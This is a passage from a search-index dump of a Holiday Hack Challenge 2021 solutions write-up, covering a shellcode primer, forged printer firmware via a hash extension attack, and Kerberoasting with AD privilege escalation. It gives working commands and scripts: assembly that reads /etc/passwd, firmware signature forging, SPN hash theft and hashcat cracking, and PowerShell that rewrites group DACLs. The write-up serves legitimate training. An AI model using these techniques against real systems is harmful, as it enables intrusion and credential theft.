to the third argument (length of the string, in bytes) mov rdx , 12 ; Perform the syscall syscall ; Return cleanly ret 10 - Opening a File ; TODO: Get a reference to this string into the correct register call foo db '/etc/passwd' , 0 foo: ; Set up a call to sys_open ; TODO: Set rax to the correct syscall number mov rax , 2 ; TODO: Set rdi to the first argument (the filename) pop rdi ; TODO: Set rsi to the second argument (flags - 0 is fine) mov rsi , 0 ; TODO: Set rdx to the third argument (mode - 0 is also fine) mov rdx , 0 ; Perform the syscall syscall ; syscall sets rax to the file handle, so to return the file handle we don't ; need to do anything else! ret 11 - Reading a File ; TODO: Get a reference to this call foo db '/var/northpolesecrets.txt' , 0 foo: ; TODO: Call sys_open ; rax = sys_open(2), rdi = filename, rsi and rdx = 0 mov rax , 2 pop rdi mov rsi , 0 mov rdx , 0 syscall ; TODO: Call sys_read on the file handle and read it into rsp ; rax = sys_read(0), rdi = file handle, rsi = rsp (buffer), rdx = number of chars to read ; remember that the previous syscall set rax to the value of the file handle mov rdi , rax mov rax , 0 mov rsi , rsp mov rdx , 255 syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) ; rax = sys_write(1), rdi = stdout(1), rsi = buffer to output, rdx = number of chars mov rax , 1 mov rdi , 1 mov rsi , rsp mov rdx , 255 syscall ; TODO: Call sys_exit mov rax , 60 syscall Completion Running the code for the last exercise sends the following text to Stdout Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community. Answer cyber security knowledge Talk to Ruby Cyster to receive hints for Objective 7) Printer Exploitation Oh man - what is this all about? Great work though. So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks ? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing!","title":"6) Shellcode Primer"},{"location":"objectives/O6_Shellcode_Primer/#objective-6-shellcode-primer","text":"Difficulty : Complete the Shellcode Primer in Jack's office. According to the last challenge, what is the secret to KringleCon success? \"All of our speakers and organizers, providing the gift of ____, free to the community.\" Talk to Chimney Scissorsticks in the NetWars area for hints.","title":"Objective 6) Shellcode Primer"},{"location":"objectives/O6_Shellcode_Primer/#hints-and-resources","text":"Hints provided after helping Chimney Scissorsticks and completing the Holiday Hero Terminal Challenge Shellcode Primer Primer If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Debugging Shellcode Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Register Stomping Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.","title":"Hints and Resources"},{"location":"objectives/O6_Shellcode_Primer/#troll-introduction","text":"Talk to Ruby Cyster in Jack's Office Hey, I'm Ruby Cyster. Don't listen to anything my sister, Ingreta, says about me. So I'm looking at this system, and it has me a little bit worried. If I didn't know better, I'd say someone here is learning how to hack North Pole systems. Who's got that kind of nerve! Anyway, I hear some elf on the other roof knows a bit about this type of thing.","title":"Troll Introduction"},{"location":"objectives/O6_Shellcode_Primer/#solution","text":"Open the Shellcode Primer by clicking on the monitor next to Ruby or use the direct link https://tracer.kringlecastle.com . The primer will walk you through eleven progressively more difficult shellcode exercises, solutions for which are provided below.","title":"Solution"},{"location":"objectives/O6_Shellcode_Primer/#1-introduction","text":"No code needs to be added to complete this level.","title":"1 - Introduction"},{"location":"objectives/O6_Shellcode_Primer/#2-loops","text":"No code needs to be added to complete this level","title":"2 - Loops"},{"location":"objectives/O6_Shellcode_Primer/#3-getting-started","text":"; This is a comment! We'll use comments to help guide your journey. ; Right now, we just need to RETurn! ; ; Enter a return statement below and hit Execute to see what happens! ret","title":"3 - Getting Started"},{"location":"objectives/O6_Shellcode_Primer/#4-returning-a-value","text":"; TODO: Set rax to 1337 mov rax , 1337 ret ; Return, just like we did last time ret","title":"4 - Returning a Value"},{"location":"objectives/O6_Shellcode_Primer/#5-system-calls","text":"; TODO: Find the syscall number for sys_exit and put it in rax mov rax , 60 ; TODO: Put the exit_code we want (99) in rdi mov rdi , 99 ; Perform the actual syscall syscall","title":"5 - System Calls"},{"location":"objectives/O6_Shellcode_Primer/#6-calling-into-the-void","text":"No code needs to be added to complete this level","title":"6 - Calling Into the Void"},{"location":"objectives/O6_Shellcode_Primer/#7-getting-rip","text":"; Remember, this call pushes the return address to the stack call place_below_the_nop ; This is where the function *thinks* it is supposed to return nop ; This is a 'label' - as far as the call knows, this is the start of a function place_below_the_nop: ; TODO: Pop the top of the stack into rax pop rax ; Return from our code, as in previous levels ret","title":"7 - Getting RIP"},{"location":"objectives/O6_Shellcode_Primer/#8-hello-world","text":"; This would be a good place for a call call foo ; This is the literal string 'Hello World', null terminated, as code. Except ; it'll crash if it actually tries to run, so we'd better jump over it! db 'Hello World' , 0 ; This would be a good place for a label and a pop foo: pop rax ; This would be a good place for a re... oh wait, it's already here. Hooray! ret","title":"8 - Hello, World!"},{"location":"objectives/O6_Shellcode_Primer/#9-hello-world","text":"; TODO: Get a reference to this string into the correct register call foo db 'Hello World!' , 0 foo: ; Set up a call to sys_write ; TODO: Set rax to the correct syscall number for sys_write mov rax , 1 ; TODO: Set rdi to the first argument (the file descriptor, 1) mov rdi , 1 ; TODO: Set rsi to the second argument (buf - this is the \"Hello World\" string) pop rsi ; TODO: Set rdx to the third argument (length of the string, in bytes) mov rdx , 12 ; Perform the syscall syscall ; Return cleanly ret","title":"9 - Hello, World!!"},{"location":"objectives/O6_Shellcode_Primer/#10-opening-a-file","text":"; TODO: Get a reference to this string into the correct register call foo db '/etc/passwd' , 0 foo: ; Set up a call to sys_open ; TODO: Set rax to the correct syscall number mov rax , 2 ; TODO: Set rdi to the first argument (the filename) pop rdi ; TODO: Set rsi to the second argument (flags - 0 is fine) mov rsi , 0 ; TODO: Set rdx to the third argument (mode - 0 is also fine) mov rdx , 0 ; Perform the syscall syscall ; syscall sets rax to the file handle, so to return the file handle we don't ; need to do anything else! ret","title":"10 - Opening a File"},{"location":"objectives/O6_Shellcode_Primer/#11-reading-a-file","text":"; TODO: Get a reference to this call foo db '/var/northpolesecrets.txt' , 0 foo: ; TODO: Call sys_open ; rax = sys_open(2), rdi = filename, rsi and rdx = 0 mov rax , 2 pop rdi mov rsi , 0 mov rdx , 0 syscall ; TODO: Call sys_read on the file handle and read it into rsp ; rax = sys_read(0), rdi = file handle, rsi = rsp (buffer), rdx = number of chars to read ; remember that the previous syscall set rax to the value of the file handle mov rdi , rax mov rax , 0 mov rsi , rsp mov rdx , 255 syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) ; rax = sys_write(1), rdi = stdout(1), rsi = buffer to output, rdx = number of chars mov rax , 1 mov rdi , 1 mov rsi , rsp mov rdx , 255 syscall ; TODO: Call sys_exit mov rax , 60 syscall","title":"11 - Reading a File"},{"location":"objectives/O6_Shellcode_Primer/#completion","text":"Running the code for the last exercise sends the following text to Stdout Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community. Answer cyber security knowledge Talk to Ruby Cyster to receive hints for Objective 7) Printer Exploitation Oh man - what is this all about? Great work though. So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks ? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing!","title":"Completion"},{"location":"objectives/O7_Printer_Exploitation/","text":"Objective 7) Printer Exploitation Difficulty : Investigate the stolen Kringle Castle printer . Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help with this objective. Hints and Resources Hints provided after helping Ruby Cyster and completing the Shellcode Primer Objective Printer Firmware When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Hash Extension Attacks Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. Dropping Files Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/ . Other Resources JQ - Command line JSON processor https://stedolan.github.io/jq/ Setup To complete this objective we need several additional tools as well as the hash_extender utility referenced in the hints. For this writeup I am using the Windows Subsystem for Linux with a fresh Ubuntu image to run these, but other environments will work as well. First, install the various components that will be used sudo apt install git jq make gcc libssl-dev Then, get a copy of the hash_extender tool and compile it git clone https://github.com/iagox86/hash_extender cd hash_extender make Solution Click on the printer in Jack's Office or use the direct link https://printer.kringlecastle.com . Exploring the printer UI we discover that the only portion that is really available to us is the 'Firmware Update' menu item. On this page we can upload new firmware, apply that uploaded firmware, and download a copy of the existing firmware file. Download a copy of the firmware file, firmware-export.json. Inspecting this we find that it is a json file consisting of 4 attributes firmware: base64 encoded firmware file signature: sha256 signature of the firmware file secret_length: 16 algorithm: SHA256 Screenshot Export the base64 encoded firmware file and the signature into separate files using the jq utility cat firmware-export.json | jq -r \".firmware\" > firmware_json_firmware.txt cat firmware-export.json | jq -r \".signature\" > firmware_json_signature.txt No we need to determine what type of file it is, so we decode it and analyze it with the file command. cat firmware_json_firmware.txt | base64 -d | file - The result of this tells us that it is a zip file, so we decode it into an appropriately named file and then look to see what is inside it. cat firmware_json_firmware.txt | base64 -d > original_firmware.zip unzip -l original_firmware.zip Screenshot The zip file contains a single file named firmware.bin. Presumably this is the file that the printer will execute when performing a firmware update. So to exploit the printer we want to have it execute a firmware.bin file containing our commands instead. To retrieve the contents of the printer log file (/var/spool/log/) one of the hints suggests that if we copy it to /app/lib/public/incoming then we will be able to access it through the web interface. So, we create a new firmware.bin that will do that and put it into a new zip file. echo 'cp /var/spool/printer.log /app/lib/public/incoming/nutmeg-printer.log' > firmware.bin zip exploit_firmware.zip firmware.bin Now we need to get the printer to process the exploit_firmware.zip file as if it were legitimate firmware. But we can't just create a new JSON file with this file instead of the original one because the hash that must accompany it is dependent on a 16 character secret that we do not have access to. Fortunately for us, a property of zip files, and something that Ruby Cyster mentions upon completion of Objective 6 , is that if you concatenate two zip files together then when unzipping only the last one is processed. So by using a hash extension attack tool such as hash_extenter we can append the exploit zip file to the original zip file and recompute a new hash that will pass the validation checks. Then when the printer unzips the contents it will only get our malicious firmware.bin. The following steps detail this process. First, get the original and exploit firmware zip files into hex format for input into hash_extender. xxd -p original_firmware.zip | tr -d '\\n' > original_firmware_zip.hex xxd -p exploit_firmware.zip | tr -d '\\n' > exploit_firmware_zip.hex Second, run hash extender to generate a new file that appends 'exploit_firmware.zip' to the original 'firmware.zip' and computes a new signature. The results of this command will be outputted to a file in table format for easier processing in the next step. ./hash_extender/hash_extender -d `cat original_firmware_zip.hex` --data-format=hex -s `cat firmware_json_signature.txt` -a `cat exploit_firmware_zip.hex` --append-format=hex -f sha256 -l 16 -table > hash_extender_output.txt Third, extract the signature and new file (in hex format) from the output, then turn the hex of the file back into a binary zip file. awk '{ print $2 }' hash_extender_output.txt > new_signature.txt awk '{ print $3 }' hash_extender_output.txt > exploit_zip.hex xxd -p -r exploit_zip.hex > exploit.zip Warning As of this writing I believe there is a bug in hash_extender that is preventing the secret length from being included as the 2nd field in the table output. If this bug is resolved then the awk fields being extracted above will likely need to change to $3 and $4. Finally, we create a new json file using our concatenated exploit zip file and it's signature. echo -n '{\"firmware\":\"' > exploit.json base64 -w 0 exploit.zip >> exploit.json echo -n '\",\"signature\":\"' >> exploit.json cat new_signature.txt | tr -d '\\n' >> exploit.json echo -n '\",\"secret_length\":16,\"algorithm\":\"SHA256\"}' >> exploit.json With our exploit.json file in hand, we upload it to the printer, update, then view the printer log file that is copied to the incoming folder when the printer executes our script (in this example: https://printer.kringlecastle.com/incoming/nutmeg-printer.log). Completion Answer Troll_Pay_Chart.xlsx","title":"7) Printer Exploitation"},{"location":"objectives/O7_Printer_Exploitation/#objective-7-printer-exploitation","text":"Difficulty : Investigate the stolen Kringle Castle printer . Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help with this objective.","title":"Objective 7) Printer Exploitation"},{"location":"objectives/O7_Printer_Exploitation/#hints-and-resources","text":"Hints provided after helping Ruby Cyster and completing the Shellcode Primer Objective Printer Firmware When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Hash Extension Attacks Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. Dropping Files Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/ . Other Resources JQ - Command line JSON processor https://stedolan.github.io/jq/","title":"Hints and Resources"},{"location":"objectives/O7_Printer_Exploitation/#setup","text":"To complete this objective we need several additional tools as well as the hash_extender utility referenced in the hints. For this writeup I am using the Windows Subsystem for Linux with a fresh Ubuntu image to run these, but other environments will work as well. First, install the various components that will be used sudo apt install git jq make gcc libssl-dev Then, get a copy of the hash_extender tool and compile it git clone https://github.com/iagox86/hash_extender cd hash_extender make","title":"Setup"},{"location":"objectives/O7_Printer_Exploitation/#solution","text":"Click on the printer in Jack's Office or use the direct link https://printer.kringlecastle.com . Exploring the printer UI we discover that the only portion that is really available to us is the 'Firmware Update' menu item. On this page we can upload new firmware, apply that uploaded firmware, and download a copy of the existing firmware file. Download a copy of the firmware file, firmware-export.json. Inspecting this we find that it is a json file consisting of 4 attributes firmware: base64 encoded firmware file signature: sha256 signature of the firmware file secret_length: 16 algorithm: SHA256 Screenshot Export the base64 encoded firmware file and the signature into separate files using the jq utility cat firmware-export.json | jq -r \".firmware\" > firmware_json_firmware.txt cat firmware-export.json | jq -r \".signature\" > firmware_json_signature.txt No we need to determine what type of file it is, so we decode it and analyze it with the file command. cat firmware_json_firmware.txt | base64 -d | file - The result of this tells us that it is a zip file, so we decode it into an appropriately named file and then look to see what is inside it. cat firmware_json_firmware.txt | base64 -d > original_firmware.zip unzip -l original_firmware.zip Screenshot The zip file contains a single file named firmware.bin. Presumably this is the file that the printer will execute when performing a firmware update. So to exploit the printer we want to have it execute a firmware.bin file containing our commands instead. To retrieve the contents of the printer log file (/var/spool/log/) one of the hints suggests that if we copy it to /app/lib/public/incoming then we will be able to access it through the web interface. So, we create a new firmware.bin that will do that and put it into a new zip file. echo 'cp /var/spool/printer.log /app/lib/public/incoming/nutmeg-printer.log' > firmware.bin zip exploit_firmware.zip firmware.bin Now we need to get the printer to process the exploit_firmware.zip file as if it were legitimate firmware. But we can't just create a new JSON file with this file instead of the original one because the hash that must accompany it is dependent on a 16 character secret that we do not have access to. Fortunately for us, a property of zip files, and something that Ruby Cyster mentions upon completion of Objective 6 , is that if you concatenate two zip files together then when unzipping only the last one is processed. So by using a hash extension attack tool such as hash_extenter we can append the exploit zip file to the original zip file and recompute a new hash that will pass the validation checks. Then when the printer unzips the contents it will only get our malicious firmware.bin. The following steps detail this process. First, get the original and exploit firmware zip files into hex format for input into hash_extender. xxd -p original_firmware.zip | tr -d '\\n' > original_firmware_zip.hex xxd -p exploit_firmware.zip | tr -d '\\n' > exploit_firmware_zip.hex Second, run hash extender to generate a new file that appends 'exploit_firmware.zip' to the original 'firmware.zip' and computes a new signature. The results of this command will be outputted to a file in table format for easier processing in the next step. ./hash_extender/hash_extender -d `cat original_firmware_zip.hex` --data-format=hex -s `cat firmware_json_signature.txt` -a `cat exploit_firmware_zip.hex` --append-format=hex -f sha256 -l 16 -table > hash_extender_output.txt Third, extract the signature and new file (in hex format) from the output, then turn the hex of the file back into a binary zip file. awk '{ print $2 }' hash_extender_output.txt > new_signature.txt awk '{ print $3 }' hash_extender_output.txt > exploit_zip.hex xxd -p -r exploit_zip.hex > exploit.zip Warning As of this writing I believe there is a bug in hash_extender that is preventing the secret length from being included as the 2nd field in the table output. If this bug is resolved then the awk fields being extracted above will likely need to change to $3 and $4. Finally, we create a new json file using our concatenated exploit zip file and it's signature. echo -n '{\"firmware\":\"' > exploit.json base64 -w 0 exploit.zip >> exploit.json echo -n '\",\"signature\":\"' >> exploit.json cat new_signature.txt | tr -d '\\n' >> exploit.json echo -n '\",\"secret_length\":16,\"algorithm\":\"SHA256\"}' >> exploit.json With our exploit.json file in hand, we upload it to the printer, update, then view the printer log file that is copied to the incoming folder when the printer executes our script (in this example: https://printer.kringlecastle.com/incoming/nutmeg-printer.log).","title":"Solution"},{"location":"objectives/O7_Printer_Exploitation/#completion","text":"Answer Troll_Pay_Chart.xlsx","title":"Completion"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/","text":"Objective 8) Kerberoasting on an Open Fire Difficulty : Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal . Find Eve Snowshoes in Santa's office for hints. Note When I played through this objective did not unlock until the HoHo ... No Terminal Challenge was completed. Hints and Resources Hints provided after helping Eve Snowshoes and completing the HoHo ... No Terminal Challenge Kerberoast and AD Abuse Talk Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse. Kerberoasting and Hashcat Syntax Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. Hashcat Mangling Rules OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. Finding Domain Controllers There will be some 10.X.X.X networks in your routing tables that may be interesting. Also, consider adding -PS22,445 to your nmap scans to \"fix\" default probing for unprivileged scans. CeWL for Wordlist Creation CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Stored Credentials Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! Active Directory Interrogation Investigating Active Directory errors is harder without Bloodhound , but there are native methods . Other Resources Hashcat https://hashcat.net/hashcat/ GetUserSPNs Python script from SecureAuthCorp https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py Some of my scripts and files referenced in the guide https://github.com/pdecamp/HHC2021-Solutions-Guide/tree/main/Objective8 Setup For this challenge I used Hashcat and CeWL on Linux as well as the OneRuleToRuleThemAll password cracking rule file. Local System sudo apt install hashcat cewl wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule Solution Step 0: Register at the ElfU Portal and Connect Open the ElfU Portal and register an account. Note that information entered here will not be used during the challenge, so it can be your real information. After registering you will get a username and password to use for the challenge (be sure to save these and note that all accounts are reset at midnight). Step 1: Shell Escape After registering, connect to the ElfU portal ssh <username>@grades.elfu.org -p 2222 When we first connect we are presented with a captive portal where we can only view our grades and exit. To escape this portal enter Ctrl + D , which sends the EOF character to the running script and causes it to crash. We will now be at an interactive Python prompt where we can type os.system(\"/bin/bash\") to start a new bash shell. Once we've done that, we can change our default shell to /bin/bash so a) we don't need to re-escape the Grades Portal if we have to log in again, and b) scp , which we will use to transfer files to and from the ElfU system will work. Screenshot Step 2: Investigate the Network First, let's determine our own IP address ifconfig Screenshot We could scan our entire class B network (172.17.0.2/16), but that would take quite a while so lets instead start with the smaller address space represented by 172.17.0.2/24 . nmap 172.17.0.2/24 Screenshot From this scan we see that some of the machines are running the netbios-ssn service on port 139, which is where SMB shares will be found. Since our objective is to locate a research document there is a good chance that it will be located on a file share somewhere. Querying each of the systems with the command smbclient -L <ip address> we find that 172.17.0.3 is serving two promising sounding shares, 'elfu_svc_shr' and 'research_dep', but of course our account does not have access to them. Screenshot Step 3: Steal a Hash The GetUserSPNs utility provided in SecureAuthCorp's impacket toolkit can be used to find Service Principle Names that are associated with user accounts. If one if found then the utility will request a service ticket for that SPN which will allow it to obtain the hash of the user account password. First, we download GetUsersSPNs.py from the impacket GitHub repository to our local system, then transfer it to the ElfU system using scp Local System wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py scp -P 2222 GetUserSPNs.py nrsquaxzmg@grades.elfu.org:~/ Screenshot Now on the ElfU system, run GetUserSPNs.py ElfU System python3 ./GetUserSPNs.py elfu.local/nrsquaxzmg:Zapvnxoth@ -outputfile hashes.kerberoast Screenshot We have now captured the password hash for the elfu_svc account into the file hashes.kerberoast. Step 4: Crack the Hash Bring the file containing the password hash for the elfu_svc account back to our local system. Local System scp -P 2222 nrsquaxzmg@grades.elfu.org:~/hashes.kerberoast ./ Screenshot Use CeWL to build a wordlist from the ElfU registration portal that we will use as a base for our password cracking attempt. Local System cewl --with-numbers https://register.elfu.org/register > wordlist.txt Now, crack the hash using the wordlist and the OneRuleToRuleThemAll rule file. Local System hashcat -m 13100 -a 0 ./hashes.kerberoast --potfile-disable -r ./OneRuleToRuleThemAll.rule --force -O wordlist.txt Screenshot Step 5: Investigate the elfu_svc_shr File Share Now that we know the password for the elfu_svc account (Snow2021!), we can use it to connect to the elfu_svc_shr file share that we found earlier. ElfU System smbclient \\\\\\\\172.17.0.3\\\\elfu_svc_shr -U elfu_svc Screenshot Looking at the files we find a lot of PowerShell scripts. Retrieve them all to our local system so we can inspect them for anything interesting. ElfU System smb: \\> prompt off smb: \\> mget *.ps1 Screenshot Now we search the files for anything that might provide us with additional access. Possible things to search for would be the strings 'password' or 'username', but neither of those got any interesting results. What does get a result is the string 'elfu.local', which is found in a single PowerShell script named 'GetProcessInfo.ps1' GetProcessInfo.ps1 $SecStringPassword = \"76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA\" $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2 , 3 , 1 , 6 , 2 , 8 , 9 , 9 , 4 , 3 , 4 , 5 , 6 , 8 , 7 , 7 $aCred = New-Object System . Management . Automation . PSCredential -ArgumentList ( \"elfu.local\\remote_elf\" , $aPass ) Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate This script contains encrypted authentication credentials for the account 'remote_elf' to run remote PowerShell commands against the computer with the IP address 10.128.1.53. While we do not know the password for the remote_elf account, we can use the same process that GetProcessInfo.ps1 uses to run commands of our own on the remote machine. Step 6: Get Access to the research_dep Share Start the Linux version of PowerShell with the pwsh command and execute the first three lines of the GetProcesssInfo.ps1 script. This will setup things so that from here forward we only have to enter the various Invoke-Command commands. Screenshot It's probably a valid assumption that the research file we are trying to access is located on the research_dep share. Access to shares is often controlled by security groups, so we use the Invoke-Command command from GetProcessInfo.ps1 with our own content for the ScriptBlock parameter to find any groups with the word 'research' in the name. ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-ADGroup -filter \"Name -like '*research*'\" -properties Name } -Credential $aCred -Authentication Negotiate Screenshot Now we know that there is a security group named 'Research Department'. Using the PowerShell scripts referenced in Chris Davis' KringleCon talk as a starting point we can create a script that will let us see any users that have WriteDacl rights to this group. Who_Has_WriteDacl.ps1 $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString $domainDirEntry . get_ObjectSecurity (). Access | Where-Object { $_ . ActiveDirectoryRights -eq 'WriteDacl' } Transfer this script to the ElfU server using scp and execute it using Invoke-Command Local System scp -P 2222 Who_Has_WriteDacl.ps1 cauovojfjy@grades.elfu.org:~/ Screenshot ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -FilePath Who_Has_WriteDacl . ps1 -Credential $aCred -Authentication Negotiate Screenshot Conveniently for us, the remote_elf account has WriteDacl to this group. The next steps in the process is to give our user the GenericALL AD right to the group and then to add it to the group itself. Again, referencing the sample scripts from Chris Davis' we can write a single script to perform both operations. Grant_GenericAll_and_Add_to_Group.ps1 Add-Type -AssemblyName System . DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"cauovojfjy\" $password = \"Ufjeprxjh#\" $user = New-Object System . Security . Principal . NTAccount ( \"elfu.local\\$username\" ) $nullGUID = [guid] '00000000-0000-0000-0000-000000000000' $propGUID = [guid] '00000000-0000-0000-0000-000000000000' $sid = $user . Translate ( [System.Security.Principal.SecurityIdentifier] ) $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] :: None $ACE = New-Object System . DirectoryServices . ActiveDirectoryAccessRule $sid , ( [System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\" ), ( [System.Security.AccessControl.AccessControlType] \"Allow\" ), $propGUID , $inheritanceType , $nullGUID $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString $secOptions = $domainDirEntry . get_Options () $secOptions . SecurityMasks = [System.DirectoryServices.SecurityMasks] :: Dacl $domainDirEntry . RefreshCache () $domainDirEntry . get_ObjectSecurity (). AddAccessRule ( $ACE ) $domainDirEntry . CommitChanges () $domainDirEntry . dispose () $domainDirEntry = New-Object System . DirectoryServices . DirectoryEntry $ldapConnString , $username , $password $b = New-Object byte [] $sid . BinaryLength $sid . GetBinaryForm ( $b , 0 ) $hexSID = [BitConverter] :: ToString ( $b ). Replace ( '-' , '' ) $domainDirEntry . Add ( \"LDAP://<SID=$hexSID>\" ) $domainDirEntry . CommitChanges () $domainDirEntry . dispose () Again, transfer this script to the ElfU server using scp and execute it. Then, verify that our user has been added to the Research Department group. Local System scp -P 2222 Grant_GenericAll_and_Add_to_Group.ps1 cauovojfjy@grades.elfu.org:~/ ElfU System Invoke-Command -ComputerName 10 . 128 . 1 . 53 -FilePath Grant_GenericAll_and_Add_to_Group . ps1 -Credential $aCred -Authentication Negotiate Invoke-Command -ComputerName 10 . 128 . 1 . 53 -ScriptBlock { Get-ADUser -identity cauovojfjy -properties MemberOf } -Credential $aCred -Authentication Negotiate Screenshot Step 7: Retrieve the file from the research_dep share Now that we are in the Research Department security group, connect to the research_dep share. ElfU System smbclient \\\\\\\\172.17.0.3\\\\research_dep -U cauovojfjy Once connected, we find the file SantaSecretToAWonderfulHolidaySeason.pdf, so retrieve it with smb get Screenshot Finally, retrieve the file to our local system using scp and open it to find the answer to the objective. Local System scp -P 2222 cauovojfjy@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf ./ Screenshot Completion Answer Kindness","title":"8) Kerberoasting on an Open Fire"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#objective-8-kerberoasting-on-an-open-fire","text":"Difficulty : Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal . Find Eve Snowshoes in Santa's office for hints. Note When I played through this objective did not unlock until the HoHo ... No Terminal Challenge was completed.","title":"Objective 8) Kerberoasting on an Open Fire"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#hints-and-resources","text":"Hints provided after helping Eve Snowshoes and completing the HoHo ... No Terminal Challenge Kerberoast and AD Abuse Talk Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse. Kerberoasting and Hashcat Syntax Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. Hashcat Mangling Rules OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. Finding Domain Controllers There will be some 10.X.X.X networks in your routing tables that may be interesting. Also, consider adding -PS22,445 to your nmap scans to \"fix\" default probing for unprivileged scans. CeWL for Wordlist Creation CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Stored Credentials Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! Active Directory Interrogation Investigating Active Directory errors is harder without Bloodhound , but there are native methods . Other Resources Hashcat https://hashcat.net/hashcat/ GetUserSPNs Python script from SecureAuthCorp https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py Some of my scripts and files referenced in the guide https://github.com/pdecamp/HHC2021-Solutions-Guide/tree/main/Objective8","title":"Hints and Resources"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#setup","text":"For this challenge I used Hashcat and CeWL on Linux as well as the OneRuleToRuleThemAll password cracking rule file. Local System sudo apt install hashcat cewl wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule","title":"Setup"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#solution","text":"","title":"Solution"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-0-register-at-the-elfu-portal-and-connect","text":"Open the ElfU Portal and register an account. Note that information entered here will not be used during the challenge, so it can be your real information. After registering you will get a username and password to use for the challenge (be sure to save these and note that all accounts are reset at midnight).","title":"Step 0: Register at the ElfU Portal and Connect"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-1-shell-escape","text":"After registering, connect to the ElfU portal ssh <username>@grades.elfu.org -p 2222 When we first connect we are presented with a captive portal where we can only view our grades and exit. To escape this portal enter Ctrl + D , which sends the EOF character to the running script and causes it to crash. We will now be at an interactive Python prompt where we can type os.system(\"/bin/bash\") to start a new bash shell. Once we've done that, we can change our default shell to /bin/bash so a) we don't need to re-escape the Grades Portal if we have to log in again, and b) scp , which we will use to transfer files to and from the ElfU system will work. Screenshot","title":"Step 1: Shell Escape"},{"location":"objectives/O8_Kerberoasting_on_an_Open_Fire/#step-2-investigate-the-network","text":"First, let's determine our own IP address ifconfig Screenshot We could scan our entire class B network (172.17.0.2/16), but that would take quite a while so lets instead start with the smaller address space represented by 172.17.0.2/24 . nmap 172.17.0.2/24 Screenshot From this scan we see that some of the machines are running the netbios-ssn service on port 139, which is where SMB shares will be found. Since our objective is to locate a research document there is a good chance that it will be located on a file share somewhere. Querying each of the systems with the command smbclient -L <ip address> we find that 172.17.0.3 is serving two promising 